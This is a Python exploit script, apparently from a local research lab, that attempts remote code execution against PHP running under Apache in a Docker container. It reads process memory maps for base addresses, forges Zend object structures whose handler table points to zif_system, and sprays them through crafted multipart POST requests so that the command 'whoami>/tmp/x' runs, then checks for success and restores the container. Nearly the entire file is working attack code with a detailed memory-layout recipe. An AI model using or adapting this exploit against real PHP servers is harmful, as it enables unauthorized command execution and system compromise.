#!/usr/bin/env python3
"""oom72: v3 RCE attempt — maps-based bases, unified payload, all fires.

v2 lesson: aimed fires crashed via STAGE-A remnant bytes (rdi=4d4d..) —
different children hold different request populations. v3: EVERY body in
this run (warm, sacrifice, finishers) carries the same aim/super bytes,
built ONCE from bases read via /proc/<pid>/maps — no calibration crash.

Layout per 200B block (P = aimed value VA, 16-aligned):
  P+0   gc: rc=1 u32, type_info=0x108 u32 (IS_OBJECT | DESTRUCTOR_CALLED)
  P+8   handle=1 u32, pad=0 u32
  P+16  ce=0 (skipped: flags say dtor already called)
  P+24  handlers = P+144 (table OUTSIDE the frame region)
  P+32  This.value=0, u1=0, u2=1  -> num_args=1 for zif_system
  P+48  prev=0, P+56 symbol_table=0, P+64 requested=0, P+72 pad=0
  P+80  argz: value=P+104, type_info=6 (IS_STRING), u2=0
  P+104 gs: rc=1, type=0x106, h=0, len=12, val="whoami>/tmp/x\\0" pad->144
  P+144 handlers table: offset=0, free_obj=&zif_system, dtor=0, clone=0
  P+176..200 zeros; block repeated -> 400B tile.
"""
import subprocess, sys, time, struct, re

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
AT = 0x1718          # marker offset within the big anon region (measured 2 boots)
ZIF_SYSTEM = 0x39b8a0
A539 = 0x49be7b


def sh(c, t=90):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def measure_bases():
    """libphp base from any apache pid; anon region base from same pid."""
    pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
    maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
    base = None
    big = None
    for ln in maps.splitlines():
        rng = ln.split()[0]
        a, b = [int(x, 16) for x in rng.split("-")]
        if base is None and "libphp.so" in ln and ln.split()[1].startswith("r"):
            base = a
        # Zend MM heap: anonymous rw-p (no name, NOT file-backed) region >= 2MB
        if "libphp.so" not in ln and "/dev/zero" not in ln and "[" not in ln \
                and (b - a) >= 0x200000 and ln.split()[1].startswith("rw"):
            if big is None:
                big = a
    return base, big


def build_sup(libphp_base, P_va):
    def block():
        o = struct.pack("<IIIIQQ", 1, 0x108, 1, 0, 0, P_va + 144)
        o += struct.pack("<QII", 0, 0, 1)          # This.value=0 u1=0 u2=1
        o += struct.pack("<QQQQ", 0, 0, 0, 0)      # prev sym req pad (48..80)
        o += struct.pack("<QII", P_va + 104, 6, 0) # argz value type u2 (80..96)
        o += struct.pack("<QQ", 0, 0)              # 96..112? NO: 96..104 pad + gs starts 104
        o = o[:104]
        gs = struct.pack("<II", 1, 0x106) + struct.pack("<Q", 0) + \
            struct.pack("<Q", len(CMD)) + CMD + b"\x00"
        gs = gs[:40] + b"\x00" * (40 - len(gs))
        t = struct.pack("<QQQQ", 0, libphp_base + ZIF_SYSTEM, 0, 0)
        b = o + gs + t                             # 104 + 40 + 32 = 176
        return b + b"\x00" * (200 - len(b))
    return block() * 2


print("[0] boot + core env", flush=True)
boot_core_env()
base, big = measure_bases()
print("  libphp base = 0x%x; big anon base = 0x%x" % (base, big), flush=True)
assert base and big, "maps measure failed"
P_va = big + AT
sys_addr = base + ZIF_SYSTEM
print("  P = 0x%x, &zif_system = 0x%x" % (P_va, sys_addr), flush=True)

print("[1] build unified weaponized bodies", flush=True)
SUP = build_sup(base, P_va)
assert len(SUP) == 400
AT8 = struct.pack("<Q", P_va) * 2
chooser = lambda i: (SUP if i % 128 == 0 else AT8)
print("  sanity tile bytes: %s..." % SUP[:32].hex(), flush=True)

print("[2] warm (patterned, armed)", flush=True)
for i, k1 in enumerate(P.K1S[:-1]):
    code, _ = post(P.build_attack(k1, 9100000 + i * 100000, value_tile=chooser))
print("    warm done", flush=True)

print("[3] sacrifice + aimed finishers", flush=True)
for fi in range(4):
    code, resp = post(P.build_attack(3400, 9200000 + fi * 100000, value_tile=chooser))
    print("  fire%d: %s %r" % (fi, code, resp[:80]), flush=True)
    time.sleep(2)
    chk = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1'")
    if "No such" not in chk:
        print("  /tmp/x: [%s]" % chk, flush=True)
        print("*** RCE CONFIRMED on fire %d ***" % fi, flush=True)
        break
    print("  /tmp/x: not yet (%s)" % chk.splitlines()[0][:50], flush=True)

print("[4] restore", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
